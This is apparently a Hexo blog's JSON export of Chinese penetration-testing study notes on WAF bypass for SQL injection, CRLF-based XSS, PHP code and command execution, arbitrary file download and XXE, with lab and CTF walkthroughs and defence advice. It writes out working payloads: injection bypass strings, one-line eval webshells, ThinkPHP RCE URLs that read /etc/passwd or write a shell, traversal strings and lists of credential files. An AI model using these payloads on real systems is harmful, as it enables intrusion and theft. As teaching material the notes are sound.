{"meta":{"title":"CCB","subtitle":"","description":"","author":"ccb","url":"https://frankcao3.github.io"},"posts":[{"title":"Hello World","slug":"hello-world","date":"2023-10-05T11:40:46.695Z","updated":"2023-10-05T11:40:46.695Z","comments":true,"path":"posts/[object Object]/hello-world/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/hello-world/undefined","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","raw":null,"content":null,"categories":[],"tags":[]},{"title":"SQL注入-WAF绕过","slug":"渗透测试/2. SQL注入-WAF绕过","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:00:24.944Z","comments":true,"path":"posts/[object Object]/渗透测试/2. SQL注入-WAF绕过/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87/undefined","excerpt":"","text":"WAF简介功能WAF(Web Application Firewall)的具有以下四个方面的功能： 会话审计 用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制 用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构&#x2F;网络设计 当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固 这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 常用功能包括： 1.网马木马主动防御及查杀 2.流量监控 3.网站漏洞防御 4.危险组件防御 5..Net安全保护模块 6.双层防盗链链接模式 7.网站特定资源防下载 8.CC攻击防护 9.网站流量保护 10.IP黑白名单 WAF防护手段异常检测机制：拒绝不符合HTTP标准的请求 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证 白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活 状态管理：重点进行会话保护 信息泄露保护：防止服务器信息泄露。 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 如果是对于扫描器，WAF有其识别之道： 扫描器识别主要由以下几点： 扫描器指纹(head字段&#x2F;请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识 单IP+ cookie某时间段内触发规则次数 隐藏的链接标签等() Cookie植入 验证码验证，扫描器无法自动填充验证码 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404 常见WAF产品 硬件WAF 如果是串联到链路中，则可以拦截恶意流量，如果是以旁路的形式部署，则只能记录攻击但是不能拦截。硬件型WAF一般而言比软件型WAF更加昂贵，但是检测速度快，不易称为网站瓶颈。 如绿盟、启明、安恒、创宇、神州数码 软件WAF 安全狗、D盾、云锁、中间件自带的waf 云WAF 阿里云、安全狗、创宇、安恒等 WAF防护绕过 特殊符号在语句中添加某些特殊符号，并不会影响语句的执行效果。在waf绕过中，检测这些特殊符号干扰了检测机制，从而绕过检测。 通过注释符号&#x2F;**&#x2F;进行绕过1234567mysql&gt; select database/**/();+-------------+| database () |+-------------+| security |+-------------+1 row in set (0.00 sec) 通过%0A为换行符；%23为#号；%20为空格实现绕过1234567891011select * from users where id=-1 /*%0a*/union/*%0a*/select/*%0a*/1,2,3相当于unionselect1,2,3select * from users where id=-1 union%23a%0Aselect 1,2,3%23 // select a union的组合可以将安全狗屏蔽掉相当于union #aselect 1,2,3# 内联注释绕过/*!*/原理/*!*/符号内语句不会注释，可以正常的执行。 /*!select * from users*/的结果如下： /** #*/原理 比如id=1/**&amp;id=-1 union select 1,2,3#*/ 安全狗检测到的：id=1，以为/***/里面是注释不执行 但是Apache检测到的：-1 union select 1,2,3#*/ 会以后一个id值为准 应用层大小写&#x2F;关键字替换123456id=1 UnIoN/**/SeLeCT 1,user()Hex() bin() 等价于ascii()Sleep() 等价于 benchmark()Mid()substring() 等价于 substr()@@user 等价于 User()@@Version 等价于 version() 编码解码及加密解密hex,urlcode,base64等 比如关键字全部被拦截，那么尝试使用URL全编码的方式绕过拦截。由于服务器会自动对URL进行一次URL解码， 所以需要把关键词编码两次，这里需要注意的地方是，URL编码需选择全编码，而不是普通的URL编码。 更改请求提交方式GET POST COOKIE等 POST-&gt;multipart&#x2F;form-data 中间件HPP参数污染HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。 参数污染源原理 在HTTP协议中允许同样名称的参数出现多次，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。 假设这个URL：http://www.xxxx.com/search.php?id=110&amp;id=911，主要有三种情况。 百度会理解成让百度搜索: 110 # 选择了第一一个参数,放弃了第二个参数。 雅虎会理解成让雅虎搜索: 911 # 选择了第二个参数,放弃了第一个参数。 谷歌会理解成让谷歌搜索: 110 911 # 两个参数同时选择。 数据库特性Mysql技巧（1）mysql注释符有三种：#、&#x2F;…&#x2F;、– (注意–后面有一个空格) （2）空格符：[0x09, 0x0a-0x0d, 0x20, 0xa0] （3）特殊符号：%a 换行符 可结合注释符使用%23%0a，%2d%2d%0a。 （3）内联注释： /*!UnIon12345SelEcT*/ 1,user() &#x2F;&#x2F;数字范围 1000-50540 （4）mysql黑魔法 select&#123;x username&#125;from&#123;x11 test.admin&#125;; SQL Server技巧（1）用来注释掉注射后查询的其余部分： &#x2F;* C语言风格注释 – SQL注释 ; 00％ 空字节 （2）空白符：[0x01-0x20] （3）特殊符号：%3a 冒号 id&#x3D;1 union:select 1,2 from:admin （4）函数变形：如db_name[空白字符]() Oracle技巧（1）注释符：–、&#x2F;**&#x2F; （2）空白字符：[0x00, 0x09, 0x0a-0x0d, 0x20] 配合FUZZselect * from admin where id&#x3D;1【位置一】union【位置二】 select【位置三】1,2,db_name()【位置四】from【位置五】admin 逻辑层逻辑问题（1）云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。 （2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。 （3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。 （4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。 比如：id=1%00and 1=2 union select 1,2,column_name from information_schema.columns 性能问题猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 例子1： ?id&#x3D;1 and (select 1)&#x3D;(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9 PS：0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 例子2： ?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata 备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。 白名单方式一：IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypass waf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 方式二：静态资源 特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别 方式三：url白名单 为了防止误拦，部分waf内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system等管理后台。 只要url中存在白名单的字符串，就作为白名单不进行检测。 常见的url构造： http://10.9.9.201/sql.php/admin.php?id=1 http://10.9.9.201/sql.php?a=/manage/&amp;b=../etc/passwd http://10.9.9.201/../../../manage/../sql.asp?id=2 waf通过&#x2F;manage&#x2F;“进行比较，只要uri中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd 绕过防御规则。 方式四：爬虫白名单 部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种： 1、 根据UserAgent 2、通过行为来判断 UserAgent可以很容易欺骗，我们可以伪装成爬虫尝试绕过。 User Agent Switcher (Firefox 附加组件)，下载地址：https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/ 缓冲区溢出整合绕过","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"CRLF注入漏洞（反弹型XSS）","slug":"渗透测试/4. CRLF漏洞（反弹型XSS）","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:00:37.218Z","comments":true,"path":"posts/[object Object]/渗透测试/4. CRLF漏洞（反弹型XSS）/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20CRLF%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8F%8D%E5%BC%B9%E5%9E%8BXSS%EF%BC%89/undefined","excerpt":"","text":"CRLF 注入漏洞参考：https://blog.csdn.net/weixin_44431280/article/details/122869484 CRLF 简介CRLF 指的就是回车符（CR，ASCII-13，\\r，%0d）和换行符（LF，ASCII-10，\\n，%0a） 即%0d%0a。 操作系统就是通过这个标识进行换行的，相当于我们键盘的回车键。 HTTP协议中的CRLF： 在HTTP协议报文中，请求行与请求头通过一个CRLF（\\r\\n）隔开，请求头（header）和请求正文（body）之间通过两个CRLF（\\r\\n）隔开，如下图： 所以，一旦我们通过URL能够控制HTTP 消息头（请求行）中的字符，注入一些恶意的换行，这样我们就能构造恶意的请求行或请求正文，注入一些会话Cookie或者HTML代码。所以CRLF Injection又称为HTTP响应拆分漏洞HTTP Response Splitting，简称HRS。 利用Cookie会话固定在URL参数中构造%0d%0aSet-Cookie:crlf=ture 查看HTTP响应包，可以发现HTTP响应头存在了Set-Cookie:crlf=true。因为加入了一个CRLF，所以URL中的一部分内容被作为请求头解析，而$_GET变量接受的URL会直接作为响应头中的Location字段返回。 反射型XSS攻击如果此时我们在URL中加入%0d%0aSet-Cookie:%20de=a%0d%0a%0d%0a&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，那么服务端返回界面将会如下图： 因为添加了两个CRLF的情况，JS脚本会被识别为HTTP响应正文被浏览器执行，那么就会产生反射性XSS攻击. CRLF注入漏洞防护建议 服务端前增加WAF进行防护 对用户的数据进行合法性校验，对特殊的字符进行编码，如 &lt;、&gt;、’、”、CR、LF 等，限制用户输入的 CR 和 LF，或者对 CR 和 LF 字符正确编码后再输出，以防止注入自定义 HTTP 头避免输入的数据污染其他 HTTP 首部字段。","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"RCE代码及命令执行","slug":"渗透测试/6. RCE代码及命令执行","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:00:57.177Z","comments":true,"path":"posts/[object Object]/渗透测试/6. RCE代码及命令执行/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/undefined","excerpt":"","text":"RCE 代码及命令执行漏洞 remote command&#x2F;code execute 分为远程命令执行和远程代码执行。 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。 代码执行漏洞原理应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、assert、eval、preg_replace、shell_exec、passthru、popen、proc_popen、escapeshellcmd、pcntl_exec、call_user_func、call_user_func_array、array_map、动态函数 等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行，这就是命令执行漏洞。 以上函数主要也在webshell中用的多，实际上在正常应用中差别不太大，用得最多的还是前三个。 产生web源码：thinkphp、eyoucms、wordpress 中间件平台：tomcat、struts2、redis 其他平台：php-cgi、jenkins-cl、java-RMI 可以进一步参考vulhub中的漏洞。 危害 执行任意代码 向网站写WebShell 控制整个网站甚至服务器 例如获取服务器网络配置、php版本信息： 函数介绍eval()eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 在服务器上创建一下代码test.php： 1234&lt;?php，$code=$_GET[&#x27;x&#x27;] ; eval($code);?&gt; 查看文件： 查看管理员： 添加管理员： assert()1234567&lt;?php assert($_POST[&#x27;a&#x27;]);?&gt;// 支持动态调用，但是在php7.0.29之后的版本不支持动态调用&lt;?php$a = &#x27;assert&#x27;;$a($_POST[&#x27;a&#x27;]);? preg_replace()此函数的作用是对一个字符串进行正则处理。 1mixed preg_replace ( mixed $ pattern , mixed $ replacement , mixed $ subject [, int $ limit = -1 [, int &amp;$ count ]] ) call_user_func()把第一参数作为回调函数 call_user_func_array()调用回到函数，并把第一个数组参数作为回到函数的参数 array_ map()为数组的每个元素应用回调函数 漏洞利用一般找CMS相应版本漏洞，如ThinkPHP2.1 一句话木马 给语句加上了${}，令其为变量，可作为动态函数执行。 http://www.xxx.com/News/detail/id/&#123;$&#123;@eval($_POST[aa])&#125;&#125; 得到当前路径http://www.xxx.com/News/detail/id/&#123;$&#123;print(getcwd()))&#125;&#125; 读文件http://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_get_contents($_POST[&#39;f&#39;])))&#125;&#125;POST的数据为：f=/etc/passwd 写shellhttp://www.xxx.com/News/detail/id/&#123;$&#123;exit(var_dump(file_put_contents($_POST[&#39;f&#39;],$_POST[d])))&#125;&#125;POST的数据为：f=1.php&amp;d=&lt;?php @eval($_POST[&#39;aa&#39;])?&gt; 防御 少用或禁用命令执行函数 尽量少用执行命令的函数或者直接禁用。能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在disable_functions中禁用 确保动态执行的函数为指定的函数 在使用动态函数之前，确保使用的函数是指定的函数之一 参数用引号括起，且进行过滤或固定 在进入执行命令的函数&#x2F;方法之前，对参数进行过滤，对敏感字符进行转义。参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。 对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤 而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。 对于eval( )函数一定要保证用户不能轻易接触eval的参数或者用正则严格判断输入的数据格式。 对于preg_replace放弃使用&#x2F;e修饰符。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。 命令执行漏洞原理用户通过浏览器提交操作系统执行命令，由于服务器端 没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 在操作系统中，&amp;、|、||都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。（||只要满足第一个条件，后面的条件就不再判断，而|要对所有的条件进行判断） Windows系统命令拼接： 1234“|”：管道符，前面命令标准输出作为后面命令的标准输入。“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B“||” commandA || commandB 运行命令A，如果失败则运行命令B“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B 例题：https://blog.csdn.net/m0_62851980/article/details/124166126 产生web源码：Nexus、Webmin、ElasticSearch 中间件平台：Weblogic、Apache、Postgresql 其他环境：Samba、Supervisord 函数介绍system()system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下： 1system(command, return_var) 其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。 exec()exec函数可以用来执行一个外部的应用程序。 1exec (command, output, return_var) 其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值 passthru()passthru函数可以用来执行一个UNIX系统命令并显示原始的输出。 当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。 Passthru函数原型如下： 1passthru (command, return_var) 其中，command是要执行的命令，return_var存放执行命令后的状态值。 shell_exec()执行shell命令并返回输出的字符串，函数原型如下： 1shell_exec(command) 其中，command是要执行的命令。 popen()不返回执行结果，而是返回一个文件指针。 proc_open()pcntl_exec()在当前进程空间执行指定程序 echo()若php代码中，echo后跟的是反引号括起的内容，则会将该内容作为代码执行并输出结果，实际调用的将是Shell_exec()。 https://blog.csdn.net/qq_37348714/article/details/108859203 以墨者学院PHP代码分析溯源（第4题）为例： 有一网站，已知其php源码内容如下。由于存在解码和压缩函数，因此在在线运行中跑一下得到执行结果，其中echo的内容就是反引号括起的，所以会存在代码执行： 然后进一步使用参数a来进行命令执行： 看到该网站下有一个key开头的php文件，查看该文件内容（注意使用tac绕过对cat命令的过滤）： 防御 尽量不要使用命令执行函数 客户端提交的变量在进入执行命令函数方法之前，一定要做好过滤，对敏感字符进行转义 在使用动态函数之前，确保使用的函数是指定的函数之一 对PHP语言来说，不能完全控制的危险函数最好不要使用 绕过绕过对空格的检查： 比如cat flag.txt，要替换掉空格，且保持仍可执行： 1234567891011$IFS$1 //$1改成$加其他数字都行，都能当作空格来用&#123;cat,flag.txt&#125;cat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txt 绕过关键词： 1tac flag.txt 挖掘 代码审计 最主要的方式，借助代码审计工具，非常方便的审计出此类漏洞 已知的CMS漏洞 已知的CMS，有很多每年都会爆出来很多此类的漏洞 页面传参查找 针对页面有传参的地方，重点关注传入恶意代码尝试，概率相对较低 案例墨者靶场黑盒层 RCE 漏洞检测-公开漏洞Webmin未经身份验证的远程代码执行 Webmin是基于Web的Unix系统管理工具。为了降低 Linux系统的管理难度，有时候会对公司内的Linux主机或VPS系统预装了网页管理工具webmin。 Webmin的RCE漏洞存在于密码重置页面中。该页面允许未经身份验证的用户通过简单的POST请求执行任意命令。 https://www.cnblogs.com/whoami101/p/11465877.html 在注册界面提交后BP抓包，将post的URL改为/password_change.cgi（修改密码的URL），post请求主体改为old等参数。其中使用old参数作为命令执行的入口，令old&#x3D;{shell}： 这里old&#x3D;ls，所以输出了服务器的当前文件目录（这里是直接在浏览器F12调试中修改的数据包）： 然后令old&#x3D;&#x2F;key.txt读取文件，获得flag。 Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面Apache Struts2远程代码执行漏洞（S2-037复现） Struts2漏洞检查工具2019版 V2.3 by shack2 20190927 struts2漏洞扫描工具：Struts2-Scan 1234567891011121314151617181920212223#工具参数说明（Struts2批量扫描利用工具）：---Usage: Struts2Scan.py [OPTIONS]Options: -i, --info 漏洞信息介绍 -v, --version 显示工具版本 -u, --url TEXT URL地址 -n, --name TEXT 指定漏洞名称, 漏洞名称详见info -f, --file TEXT 批量扫描URL文件, 一行一个URL -d, --data TEXT POST参数, 需要使用的payload使用&#123;exp&#125;填充 -c, --encode TEXT 页面编码, 默认UTF-8编码 -p, --proxy TEXT HTTP代理. 格式为http://ip:port -t, --timeout TEXT HTTP超时时间, 默认10s -w, --workers TEXT 批量扫描进程数, 默认为10个进程 --header TEXT HTTP请求头, 格式为: key1=value1&amp;key2=value2 -e, --exec 进入命令执行shell --webpath 获取WEB路径 -r, --reverse TEXT 反弹shell地址, 格式为ip:port --upfile TEXT 需要上传的文件路径和名称 --uppath TEXT 上传的目录和名称,如:/usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet 关闭打印不存在漏洞的输出，只保留存在漏洞的输出 -h, --help Show this message and exit. 专业话语： EXP：Exploit漏洞利用代码，运行之后对目标进行攻击。POC：Proof of Concept漏洞验证代码，检测目标是否存在对应漏洞。 一句话 Webshell 后门原理代码执行-拓展说明 菜刀将操作系统的命令写入参数，以post方式传递给网站后门，网站后门通过eval()代码执行来执行系统命令或者代码，从而达到了菜刀远程操作服务器的目的.","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"文件下载","slug":"渗透测试/8. 文件下载","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:01:11.579Z","comments":true,"path":"posts/[object Object]/渗透测试/8. 文件下载/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.%20%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/undefined","excerpt":"","text":"文件下载 原理网站上文件下载功能的实现通常是通过对参数filename的值的对应，获取在服务器上所需下载的文件的绝对路径，然后读取文件内容并发送给客户端进行下载。 如果这些有下载功能的网站没有对前端用户的下载请求的文件类型、目录做合理严谨的规则进行过滤，导致用户通过路径回溯符../等相关操作，跳出了程序本身的限制目录，然后再利用文件下载功能，使前端下载请求可以下载服务器中的任意文件。 产生条件网站给用户提供了下载文件的功能，并能接收相关的参数变量 后端使用了读取文件的相关函数 网站对前端用户读取文件的请求没有进行相应的控制或控制不严（限制、校验） 网站能输出请求文件的内容，提供给前端下载 文件下载漏洞的挖掘寻找漏洞位置找到有文件下载功能的网站： 根据功能：一般可以根据下载功能去找，一些明显的软件下载网站等； 根据关键字符串： 123456789download.php?path=download.php?file=down.xxx?filename=down.php?file=data.php?file=read.xxx?filename=readfile.php?file=read.php?filename= 1234567891011121314151617181920&amp;ReadPath=&amp;FilePath=&amp;ﬁlepath=&amp;Filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;Inputfile=&amp;url=&amp;urls=&amp;Lang=&amp;dis=&amp;data=&amp;Data=&amp;readﬁle=&amp;ﬁlep=&amp;src=&amp;menu=META-INFWEB-INF 分析下载链接中的参数变量一般要先解码。 比如http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTExMTcveXN0XzEuNC41X2RhbmdiZWkuYXBr s的值经过base64解码后得到下载文件路径：down/20211117/yst_1.4.5_dangbei.apk 然后看参数能否修改。 linux的一些系统文件路径： 123456789/etc/passwd //保存了系统中所有的用户信息/etc/shadow //用户的密码信息/root/.ssh/authorized_keys //公钥文件/root/.bash_history //用户终端操作历史记录/usr/local/app/apache2/conf/httpd.conf //apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //php相关设置/etc/httpd/conf/httpd.conf //apache/etc/php5/apache2/php.ini //ubuntu系统的默认路径 windows的一些系统文件路径： 123456789101112C:\\boot.ini //查看系统版本C:\\windows\\system32\\inetsrv\\MetaBase.xml //查看IIS虚拟主机配置文件C:\\windows\\repair\\sam //存储Windows系统初次安装的密码C:\\Program Files\\mysql\\my.ini //mysql配置，记录管理员登陆过的MYSQL用户名和密码C:\\Program Files\\mysql\\data\\mysql\\user.MYD //mysql.user表中的数据库连接密码C:\\windows\\php.ini php.ini //php配置文件C:\\Windows\\system.ini //winnt的php配置信息C:\\Windows\\win.ini //winnt的mysql配置文件C:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini //存储虚拟主机网站路径和密码C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf 或C:\\apache\\conf\\httpd.conf //查看WINDOWS系统apache文件C:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站resin文件配置信息.C:\\Windows\\System32\\drivers\\etc\\hostswinserver //配置Telnet信息 tomcat的一些配置文件的路径： 12345apache-tomcat-8.5.51/conf/tomcat-users.xml //tomcat的角色(授权用户)配置文件apache-tomcat-8.5.51/conf/server.xml //tomcat的主配置文件apache-tomcat-8.5.51/conf/web.xml //tomcat应用程序的部署描述符文件apache-tomcat-8.5.51/logs/catalina.out// 即tomcat的标准输出和标准出错，所有输出到这两个位置的都会进入catalina.out，这里包含tomcat运行自己输出的日志以及应用里向console输出的日志。 1234567891011apache： /etc/httpd/conf/httpd.conf /etc/apache2/httpd.conf /etc/apache2/apache2.confnginx： /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.confredis： /etc/redis.conf index.php?f=../../../../../../etc/passwd 危害下载服务器的任意文件： 获得网站web源码，再对代码进行审计，以获得更多的漏洞 获得网站、服务器、系统、数据库等中间件配置文件 获得应用的系统配置文件 内网探测 下载各种.log文件，并寻找后台地址、文件上传点等地方 利用以pikachu为例： 分析下载文件的URL直接在网站上查看图片，可以知道图片在网站内的存储地址：http://10.1.1.7/vul/unsafedownload/download/rayal.png 该图片的下载链接为：http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=rayal.png 测试能否下载其他文件通过上面的两个下载的地址我们可以可以测试文件下载漏洞： http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../execdownload.php 根据上面的分析通过链接下载到了文件execdownload.php。 很明显filename参数这里存在文件下载漏洞。 扫描网站目录接下来可以使用御剑、铸剑等工具进行探针，看一看存在哪些敏感文件，构造我们所需要的下载链接： 下载敏感文件进一步攻击下载好的文件代码中去分析路径和文件包含。 举例：config.php配置文件—&gt;得到数据库密码—&gt;连接数据库 http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../../inc/function.php 下载成功： 防御 净化数据： 对用户传过来的文件名参数进行统一编码 对文件类型进行白名单控制 对包含恶意字符或者空字符的参数进行拒绝。比如**过滤.(点)**，使用户在url中不能回溯上级目录，正则严格判断用户输入参数的格式。 要下载的文件地址保存至数据库中，与网站目录隔开。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 php.ini配置open_basedir限定文件访问范围。 实例https://blog.csdn.net/m0_62619269/article/details/125043182 [RoarCTF 2019]Easy Java 登录界面尝试SQL注入，没有注入点，点击help： 分析文件下载URL URL中存在filename参数，推测可能存在文件下载漏洞。 该链接以get请求文件，但是失败，因为Java一般文件下载以post方式提交。 所以尝试用POST方式来进行请求，发现可以下载文件。下载了一个help.docx的文件。 尝试下载其他文件 这里要用到 web-inf 的知识： 123456789101112这里对WEB-INF进行一个简单的了解。WEB-INF是java的WEB应用的安全目录。1.WEB-INF/web.xml:web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。2.WEB-INF/classes:包含了站点所有用的class文件，包括servlet class和非servlet class3.WEB-INF/lib:存放web应用需要的JAR文件4.WEB-INF/src:源码目录，按照包名结构放置各个java文件5.WEB-INF/database.properties:数据库配置文件6.WEB-INF/tags:存放了自定义标签文件7.WEB-INF/jsp:jsp 1.2 一下版本的文件存放位置。8.WEB-INF/jsp2:存放jsp2.0以下版本的文件。9.META-INF:相当于一个信息包。 尝试将参数的值换为WEB-INF/web.xml，发现成功返回内容。 1234&lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;&lt;/servlet&gt; 分析文件内容发现可疑class文件。 构造payload：filename=/WEB-INF/classes/com/wm/ctf/FlagController.class，下载FlagController.class。 下载后，文件内容中存在base64编码： String flag = &quot;ZmxhZ3thNTkzMTBiMy1lZjkzLTQ5ODktOTVlMC0zYTQ2ZmZhMThiYjh9Cg==&quot;; 解码即可得到flag。","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"XXE","slug":"渗透测试/10. XXE漏洞","date":"2022-08-04T16:00:00.000Z","updated":"2023-10-05T12:01:29.052Z","comments":true,"path":"posts/[object Object]/渗透测试/10. XXE漏洞/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E/undefined","excerpt":"","text":"XXE漏洞参考： https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w https://blog.csdn.net/huangyongkang666/article/details/123818066 原理XML外部实体注入(XML External Entity) 简称XXE漏洞。 XML简介什么是XML XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 12345678910111213141516171819&lt;!-- XML声明 --&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!-- DTD文档类型定义（可选） --&gt;&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from 